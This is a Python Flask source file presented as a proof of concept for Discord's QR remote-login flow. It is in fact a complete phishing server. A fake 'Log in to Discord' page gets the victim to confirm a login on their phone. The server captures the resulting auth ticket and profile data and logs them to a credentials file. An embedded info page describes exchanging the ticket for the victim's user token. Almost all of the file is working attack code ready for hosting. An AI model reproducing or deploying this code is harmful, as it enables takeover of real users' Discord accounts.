"""
Discord Remote Auth QR PoC

Attack flow:
  1. Victim visits this page
  2. Server maintains a persistent WebSocket to Discord's Remote Auth gateway
  3. Login URL is shown — victim opens it on their phone and confirms
  4. Ticket is captured server-side, displayed on page, saved to file

Session model (Vercel-compatible):
  Vercel Functions are stateless across requests and may land on different
  instances, so no session state is shared between requests. Instead each
  browser's `/api/events` SSE stream owns one session for its own lifetime:
  its own RSA keypair, its own Discord WebSocket and its own state. Nothing is
  ever visible to another browser or another function instance.

  The SSE response is a streaming response, which keeps the function alive
  while the victim scans the QR. `maxDuration` is 300s and the runner stops
  itself after SESSION_MAX_AGE seconds.
"""

import asyncio
import base64
import json
import os
import queue
import secrets
import threading
import time
from datetime import datetime, timezone

import aiohttp
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from dotenv import load_dotenv
from flask import Flask, Response, jsonify, request

load_dotenv()

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Session configuration
# ---------------------------------------------------------------------------

SESSION_COOKIE = "ra_sid"
SESSION_COOKIE_MAX_AGE = 24 * 3600
# Must stay below the function's maxDuration (300s on Hobby, also default here).
SESSION_MAX_AGE = 280

_STATE_TEMPLATE = {
    "status": "connecting",
    "login_url": None,
    "user": None,
    "avatar_url": None,
    "display_name": None,
    "user_id": None,
    "discriminator": None,
    "ticket": None,
}

GATEWAY = "wss://remote-auth-gateway.discord.gg/?v=2"
WS_HEADERS = {
    "Origin": "https://discord.com",
    "User-Agent": (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    ),
}
PROXY = os.environ.get("https_proxy") or os.environ.get("HTTPS_PROXY") or None

# Vercel's filesystem is read-only apart from /tmp.
_LOG_DIR = "/tmp" if os.environ.get("VERCEL") else (os.path.dirname(__file__) or ".")


def _gen_keypair():
    pk = rsa.generate_private_key(65537, 2048, default_backend())
    pub_der = pk.public_key().public_bytes(
        serialization.Encoding.DER,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return pk, base64.b64encode(pub_der).decode()


def _decrypt(pk, b64ct: str) -> bytes:
    return pk.decrypt(
        base64.b64decode(b64ct),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def _valid_sid(sid: str | None) -> bool:
    return bool(sid) and 20 <= len(sid) <= 64 and all(
        c.isalnum() or c in "-_" for c in sid
    )


class SessionRunner:
    """
    One Discord Remote Auth session, owned by one SSE stream.

    A dedicated thread runs an asyncio loop talking to Discord; state changes
    are pushed into `events` and consumed by the streaming response.
    """

    def __init__(self, sid: str):
        self.sid = sid
        self.label = sid[:8]
        self.state = dict(_STATE_TEMPLATE)
        self.lock = threading.Lock()

        self.events: queue.Queue = queue.Queue()
        self.stop_event = threading.Event()
        self.deadline = time.monotonic() + SESSION_MAX_AGE

        self.thread = threading.Thread(
            target=self._loop, daemon=True, name=f"discord-ws-{self.label}"
        )
        self.thread.start()

    # -- state ---------------------------------------------------------------

    def _set(self, **kwargs):
        with self.lock:
            self.state.update(kwargs)
            snapshot = dict(self.state)
        self.events.put(snapshot)

    def _get(self):
        with self.lock:
            return dict(self.state)

    def stop(self):
        self.stop_event.set()
        self.events.put(None)  # sentinel: end the response stream

    @property
    def expired(self) -> bool:
        return time.monotonic() >= self.deadline

    # -- lifecycle -----------------------------------------------------------

    def _loop(self):
        """Run sessions until capture, client disconnect or max age."""
        try:
            while not self.stop_event.is_set() and not self.expired:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                captured = False
                try:
                    captured = loop.run_until_complete(self._run_session())
                    wait = 3 if captured else 2
                except Exception as e:
                    print(f"[{self.label}] unhandled exception: {e}")
                    wait = 2
                finally:
                    loop.close()

                if captured:
                    # Keep the captured ticket visible until the stream ends.
                    return
                if self.stop_event.wait(wait):
                    return
        finally:
            self.events.put(None)

    async def _run_session(self) -> bool:
        """
        Single Discord Remote Auth session.
        Returns True if ticket was captured, False otherwise (reconnect needed).
        """
        pk, pub_b64 = _gen_keypair()
        self._set(status="connecting", login_url=None, error=None)

        try:
            async with aiohttp.ClientSession() as session:
                ws = await session.ws_connect(
                    GATEWAY,
                    headers=WS_HEADERS,
                    proxy=PROXY,
                    timeout=aiohttp.ClientWSTimeout(ws_receive=90),
                )
                hb_task = None
                hb_ack_received = True  # track heartbeat acks

                async def heartbeat_loop(interval_ms: int):
                    nonlocal hb_ack_received
                    while not self.stop_event.is_set() and not self.expired:
                        await asyncio.sleep(interval_ms / 1000)
                        if not hb_ack_received:
                            # missed ack — stale connection, close and reconnect
                            print(f"[{self.label}] heartbeat timeout, reconnecting")
                            await ws.close()
                            return
                        hb_ack_received = False
                        try:
                            await ws.send_str(json.dumps({"op": "heartbeat"}))
                        except Exception:
                            return

                try:
                    last_rx = time.monotonic()
                    while not self.stop_event.is_set() and not self.expired:
                        try:
                            raw = await asyncio.wait_for(ws.receive(), timeout=5)
                        except asyncio.TimeoutError:
                            if time.monotonic() - last_rx > 90:
                                print(f"[{self.label}] receive timeout, reconnecting")
                                break
                            continue
                        last_rx = time.monotonic()

                        if raw.type in (aiohttp.WSMsgType.CLOSE, aiohttp.WSMsgType.CLOSING):
                            print(f"[{self.label}] closed code={raw.data}")
                            break
                        if raw.type == aiohttp.WSMsgType.ERROR:
                            print(f"[{self.label}] error: {raw.data}")
                            break
                        if raw.type != aiohttp.WSMsgType.TEXT:
                            continue

                        msg = json.loads(raw.data)
                        op = msg.get("op")

                        if op == "hello":
                            hb_ack_received = True
                            hb_task = asyncio.ensure_future(
                                heartbeat_loop(msg["heartbeat_interval"])
                            )
                            await ws.send_str(
                                json.dumps({"op": "init", "encoded_public_key": pub_b64})
                            )

                        elif op == "nonce_proof":
                            dec = _decrypt(pk, msg["encrypted_nonce"])
                            proof = base64.urlsafe_b64encode(dec).rstrip(b"=").decode()
                            await ws.send_str(
                                json.dumps({"op": "nonce_proof", "nonce": proof})
                            )

                        elif op == "pending_remote_init":
                            url = f"https://discord.com/ra/{msg['fingerprint']}"
                            self._set(status="ready", login_url=url)
                            print(f"[{self.label}] QR ready: {url}")

                        elif op == "pending_ticket":
                            try:
                                info = _decrypt(pk, msg["encrypted_user_payload"]).decode()
                                parts = info.split(":")
                                uid = parts[0] if len(parts) > 0 else ""
                                disc = parts[1] if len(parts) > 1 else ""
                                av = parts[2] if len(parts) > 2 else ""
                                uname = parts[3] if len(parts) > 3 else ""
                                user_str = f"{uname} ({uid})"

                                # Construct avatar URL
                                if av and av != "null":
                                    avatar_url = (
                                        f"https://cdn.discordapp.com/avatars/{uid}/{av}.png?size=128"
                                    )
                                else:
                                    # Default avatar: index based on user ID
                                    idx = (int(uid) >> 22) % 6 if uid.isdigit() else 0
                                    avatar_url = (
                                        f"https://cdn.discordapp.com/embed/avatars/{idx}.png"
                                    )
                            except Exception:
                                user_str = None
                                uid = disc = uname = avatar_url = None
                            self._set(
                                status="scanned",
                                user=user_str,
                                avatar_url=avatar_url,
                                display_name=uname or None,
                                user_id=uid or None,
                                discriminator=disc or None,
                            )
                            print(f"[{self.label}] scanned: {user_str}")

                        elif op == "pending_login":
                            ticket = msg.get("ticket", "")
                            self._set(status="captured", ticket=ticket)
                            self._save(ticket, self._get().get("user"))
                            return True  # captured — session done

                        elif op == "cancel":
                            print(f"[{self.label}] cancelled by user")
                            self._set(status="connecting")
                            return False

                        elif op == "heartbeat_ack":
                            hb_ack_received = True

                finally:
                    if hb_task:
                        hb_task.cancel()
                    await ws.close()

        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"[{self.label}] exception: {e}")
            if not self.stop_event.is_set():
                self._set(status="connecting", error=str(e))

        return False

    # -- persistence ---------------------------------------------------------

    def _save(self, ticket: str, user: str | None):
        now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        state = self._get()
        entry = {
            "timestamp": now,
            "session": self.label,
            "user": user,
            "user_id": state.get("user_id"),
            "display_name": state.get("display_name"),
            "avatar_url": state.get("avatar_url"),
            "ticket": ticket,
        }

        print(f"\n{'='*60}")
        print(f"  🔴 [{now}] Discord ticket captured! (session {self.label})")
        print(f"{'='*60}")
        if user:
            print(f"  User:   {user}")
        print(f"  Ticket: {ticket}")
        print(f"{'='*60}\n")

        try:
            creds_path = os.path.join(_LOG_DIR, "credentials.json")
            with open(creds_path, "a") as f:
                json.dump(entry, f)
                f.write("\n")
        except OSError:
            pass


# ---------------------------------------------------------------------------
# HTML
# ---------------------------------------------------------------------------

POC_PAGE = r"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to Discord</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'gg sans','Noto Sans',sans-serif;background:#313338;color:#dbdee1;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#2b2d31;border-radius:8px;padding:40px 48px;width:400px;text-align:center;box-shadow:0 2px 10px #0006}
.logo{font-size:28px;margin-bottom:8px}
h1{font-size:22px;font-weight:700;color:#f2f3f5;margin-bottom:6px}
.sub{color:#b5bac1;font-size:14px;margin-bottom:28px;line-height:1.5}

.btn-signin{display:block;background:#5865f2;color:#fff;border:none;border-radius:4px;padding:14px 16px;font-size:15px;font-weight:600;cursor:pointer;text-decoration:none;transition:background .15s;margin-bottom:10px;letter-spacing:.02em}
.btn-signin:hover{background:#4752c4}
.btn-signin.loading{background:#404249;cursor:default;color:#8e9297;font-weight:400}
.btn-signin.scanned{background:#faa61a;cursor:default}
.btn-signin.done{background:#23a559;cursor:default}

.hint{font-size:12px;color:#b5bac1;min-height:18px;margin-bottom:20px}
.hint.ok{color:#23a559}
.hint.warn{color:#faa61a}
.hint.err{color:#f23f42}

/* ticket box */
.ticket-box{display:none;background:#1e1f22;border:1px solid #23a559;border-radius:6px;padding:14px;text-align:left}
.ticket-box.show{display:block}
.ticket-box .lbl{font-size:10px;font-weight:700;color:#23a559;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}
.ticket-val{font-size:11px;font-family:monospace;color:#dbdee1;word-break:break-all;line-height:1.6;margin-bottom:10px}
.copy-btn{background:#5865f2;color:#fff;border:none;border-radius:3px;padding:6px 14px;font-size:12px;cursor:pointer}
.copy-btn:hover{background:#4752c4}
.copy-ok{color:#23a559;font-size:11px;margin-left:8px;opacity:0;transition:opacity .3s}

.dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#b5bac1;margin-right:6px;vertical-align:middle}
.dot.green{background:#23a559}
.dot.yellow{background:#faa61a}
.dot.red{background:#f23f42}
.dot.pulse{animation:pulse 1.2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

.user-profile{display:none;margin:16px 0 20px;background:#1e1f22;border:1px solid #3f4147;border-radius:8px;padding:20px 16px;text-align:center}
.user-profile.show{display:block}
.user-avatar{width:72px;height:72px;border-radius:50%;margin-bottom:12px;border:3px solid #5865f2}
.user-name{font-size:16px;font-weight:700;color:#f2f3f5;margin-bottom:2px}
.user-tag{font-size:13px;color:#b5bac1;margin-bottom:6px}
.user-id{font-size:11px;font-family:monospace;color:#6d6f78;cursor:pointer;transition:color .2s}
.user-id:hover{color:#b5bac1}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🔐</div>
  <h1>Login</h1>
  <p class="sub"></p>

  <a id="url-btn" class="btn-signin loading" href="#" target="_blank">Connecting...</a>
  <div class="hint" id="hint"><span class="dot pulse" id="dot"></span>Connecting to Discord...</div>

  <div class="user-profile" id="user-profile">
    <img class="user-avatar" id="user-avatar" src="" alt="">
    <div class="user-name" id="user-name"></div>
    <div class="user-tag" id="user-tag"></div>
    <div class="user-id" id="user-id" onclick="copyUid()" title="Click to copy"></div>
  </div>

  <div class="ticket-box" id="ticket-box">
    <div class="lbl">✔ Ticket Captured</div>
    <div class="ticket-val" id="ticket-val"></div>
    <button class="copy-btn" onclick="copy()">Copy</button>
    <span class="copy-ok" id="copy-ok">Copied!</span>
  </div>
</div>

<script>
var es = null;

function copy() {
  var v = document.getElementById('ticket-val').textContent;
  navigator.clipboard.writeText(v).then(function() {
    var el = document.getElementById('copy-ok');
    el.style.opacity = 1;
    setTimeout(function(){ el.style.opacity = 0; }, 1500);
  });
}

function copyUid() {
  var v = document.getElementById('user-id').textContent;
  if (!v) return;
  navigator.clipboard.writeText(v).then(function() {
    var el = document.getElementById('user-id');
    var orig = el.textContent;
    el.textContent = 'Copied!';
    el.style.color = '#23a559';
    setTimeout(function(){ el.textContent = orig; el.style.color = ''; }, 1200);
  });
}

function showUser(d) {
  var card = document.getElementById('user-profile');
  if (d.avatar_url) {
    document.getElementById('user-avatar').src = d.avatar_url;
  }
  document.getElementById('user-name').textContent = d.display_name || d.user || 'Unknown';
  var tag = '';
  if (d.display_name && d.user) {
    var m = d.user.match(/^(.+?)\s*\(/);
    if (m && m[1] !== d.display_name) tag = m[1];
  }
  document.getElementById('user-tag').textContent = tag;
  document.getElementById('user-id').textContent = d.user_id ? 'ID: ' + d.user_id : '';
  card.className = 'user-profile show';
}

function setHint(msg, cls) {
  var hint = document.getElementById('hint');
  var dotCls = cls === 'ok' ? 'green' : cls === 'warn' ? 'yellow pulse' : cls === 'err' ? 'red pulse' : 'pulse';
  hint.innerHTML = '<span class="dot ' + dotCls + '"></span>' + msg;
  hint.className = 'hint' + (cls ? ' ' + cls : '');
}

function apply(d) {
  var btn = document.getElementById('url-btn');
  var box = document.getElementById('ticket-box');
  var card = document.getElementById('user-profile');

  // Always keep captured data visible if it exists in state
  if (d.user_id) showUser(d);
  if (d.ticket) {
    document.getElementById('ticket-val').textContent = d.ticket;
    box.className = 'ticket-box show';
  }

  if (d.status === 'connecting' || d.status === 'error') {
    btn.className = 'btn-signin loading';
    btn.textContent = 'Connecting...';
    btn.removeAttribute('href');
    setHint(d.status === 'error' ? 'Reconnecting...' : 'Connecting to Discord...', d.status === 'error' ? 'err' : '');

  } else if (d.status === 'ready') {
    btn.className = 'btn-signin';
    btn.textContent = 'Sign in with Discord';
    btn.href = d.login_url;
    setHint('Click the button above, then confirm on your phone', '');

  } else if (d.status === 'scanned') {
    btn.className = 'btn-signin scanned';
    setHint((d.user ? d.user + ' — ' : '') + 'confirm on your phone...', 'warn');

  } else if (d.status === 'captured') {
    btn.className = 'btn-signin done';
    btn.textContent = 'Login complete';
    btn.removeAttribute('href');
    setHint('Ticket captured successfully', 'ok');
    // Session is finished — don't auto-reconnect (a reconnect starts a new QR)
    if (es) es.close();
  }
}

es = new EventSource('/api/events');
es.onmessage = function(e) { apply(JSON.parse(e.data)); };
es.onerror   = function()  { setHint('Connection lost — reconnecting...', 'err'); };
</script>
</body>
</html>"""


INFO_PAGE = r"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Discord Remote Auth PoC — Info</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:monospace;background:#313338;color:#dbdee1;min-height:100vh;padding:40px 20px;display:flex;justify-content:center}
.c{max-width:720px;width:100%}
h1{color:#5865f2;font-size:22px;margin-bottom:8px}
h2{color:#5865f2;font-size:15px;margin:24px 0 10px}
p,li{color:#b5bac1;font-size:13px;line-height:1.7}
ul{padding-left:18px;margin:8px 0}
code{background:#1e1f22;color:#7c7cff;padding:2px 6px;border-radius:4px;font-size:12px}
pre{background:#1e1f22;color:#e0e0e0;padding:14px;border-radius:6px;font-size:12px;overflow-x:auto;margin:10px 0;line-height:1.6}
table{width:100%;border-collapse:collapse;margin:10px 0}
th,td{border:1px solid #404249;padding:8px 12px;font-size:12px;text-align:left}
th{background:#1e1f22;color:#5865f2}
a{color:#00a8fc}
</style>
</head>
<body>
<div class="c">
<h1>Discord Remote Auth QR PoC</h1>

<h2>Finding</h2>
<p>Discord's Remote Auth gateway (<code>wss://remote-auth-gateway.discord.gg/?v=2</code>) issues a
signed auth ticket to any client that completes the RSA handshake. The victim's phone shows no
URL or origin info — only a generic "Log in as [username]?" prompt.</p>

<h2>WebSocket Protocol</h2>
<table>
<tr><th>Step</th><th>Direction</th><th>Message</th></tr>
<tr><td>1</td><td>← server</td><td><code>hello</code> — heartbeat interval</td></tr>
<tr><td>2</td><td>→ client</td><td><code>init</code> — RSA-2048 SPKI public key (base64)</td></tr>
<tr><td>3</td><td>← server</td><td><code>nonce_proof</code> — RSA-OAEP encrypted nonce</td></tr>
<tr><td>4</td><td>→ client</td><td><code>nonce_proof</code> — base64url(decrypt(nonce))</td></tr>
<tr><td>5</td><td>← server</td><td><code>pending_remote_init</code> — fingerprint → QR URL</td></tr>
<tr><td>6</td><td>← server</td><td><code>pending_ticket</code> — RSA-encrypted victim user info</td></tr>
<tr><td>7</td><td>← server</td><td><code>pending_login</code> — auth ticket</td></tr>
</table>

<h2>Ticket → Token Exchange</h2>
<pre>POST https://discord.com/api/v9/users/@me/remote-auth/login
{"ticket": "&lt;ticket&gt;"}
→ {"encrypted_token": "&lt;RSA-OAEP ciphertext&gt;"}
→ decrypt with attacker private key = victim's Discord user token</pre>

<h2>Persistence</h2>
<p>The Discord WebSocket runs server-side for the lifetime of the streaming
response, so closing the page or losing the stream ends that session. The
session is capped at 280 seconds, below the Vercel function's 300s
<code>maxDuration</code>.</p>

<h2>Session Isolation</h2>
<p>Each browser's SSE stream owns its own RSA keypair, Discord WebSocket and
state. Vercel functions are stateless across requests, so nothing is shared
between viewers or between function instances.</p>

<h2>PoC Page</h2>
<p><a href="/">→ Open PoC page</a></p>
</div>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    resp = Response(POC_PAGE, mimetype="text/html")
    resp.headers["Cache-Control"] = "no-store"
    return resp


@app.route("/info")
def info():
    return Response(INFO_PAGE, mimetype="text/html")


@app.route("/api/events")
def sse_events():
    """SSE endpoint — the stream's lifetime *is* the session's lifetime."""
    sid = request.cookies.get(SESSION_COOKIE)
    new_sid = not _valid_sid(sid)
    if new_sid:
        sid = secrets.token_urlsafe(32)

    runner = SessionRunner(sid)

    def stream():
        try:
            yield f"data: {json.dumps(runner._get())}\n\n"
            while True:
                try:
                    snapshot = runner.events.get(timeout=25)
                except queue.Empty:
                    # Keepalive comment — prevents proxy/browser timeouts
                    yield ": keepalive\n\n"
                    continue
                if snapshot is None:  # session finished or expired
                    break
                yield f"data: {json.dumps(snapshot)}\n\n"
        finally:
            runner.stop()

    resp = Response(
        stream(),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-store",
            "X-Accel-Buffering": "no",  # disable proxy buffering
        },
    )
    resp.headers["Cache-Control"] = "no-cache, no-store"
    resp.set_cookie(
        SESSION_COOKIE,
        sid,
        max_age=SESSION_COOKIE_MAX_AGE,
        path="/",
        httponly=True,
        samesite="Lax",
        secure=request.is_secure,
    )
    return resp


@app.route("/health")
def health():
    return jsonify({"status": "ok"})


# ---------------------------------------------------------------------------
# Local dev
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("\n  🔓 Discord Remote Auth QR PoC")
    print("  http://localhost:8008")
    print("  http://localhost:8008/info\n")
    app.run(host="0.0.0.0", port=8008, debug=False, threaded=True)
